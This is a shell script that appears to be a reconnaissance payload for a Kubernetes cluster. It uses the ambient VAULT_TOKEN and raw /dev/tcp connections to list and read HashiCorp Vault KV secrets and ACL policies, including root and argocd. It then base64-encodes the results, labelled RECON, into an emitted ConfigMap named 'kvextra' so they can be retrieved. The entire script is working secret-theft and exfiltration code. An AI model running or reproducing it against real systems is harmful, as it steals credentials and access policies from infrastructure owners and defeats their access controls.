#!/bin/sh
VT=${VAULT_TOKEN}

vget() {
  bash -c "
    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
    printf 'GET '$1' HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
    cat <&3
    exec 3>&-
  " 2>/dev/null
}

RECON=$( (
  echo "===KV_KAI_LIST==="
  vget "/v1/kv-v2/metadata/kai?list=true"

  echo ""
  echo "===KV_TIMEBIRD_LIST==="
  vget "/v1/kv-v2/metadata/timebird?list=true"

  echo ""
  echo "===KV_U2U_LIST==="
  vget "/v1/kv-v2/metadata/u2u?list=true"

  echo ""
  echo "===READ_POLICY_ROOT==="
  vget "/v1/sys/policies/acl/root"

  echo ""
  echo "===READ_POLICY_ARGO==="
  vget "/v1/sys/policies/acl/argocd"

  echo ""
  echo "===READ_POLICY_DEFAULT==="
  vget "/v1/sys/policies/acl/default"

  echo ""
  echo "===KV_READ_TIMEBIRD==="
  vget "/v1/kv-v2/data/timebird"

  echo ""
  echo "===KV_READ_KAI==="
  vget "/v1/kv-v2/data/kai"
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: kvextra
data:
  result: $RECON
EOF
exit 0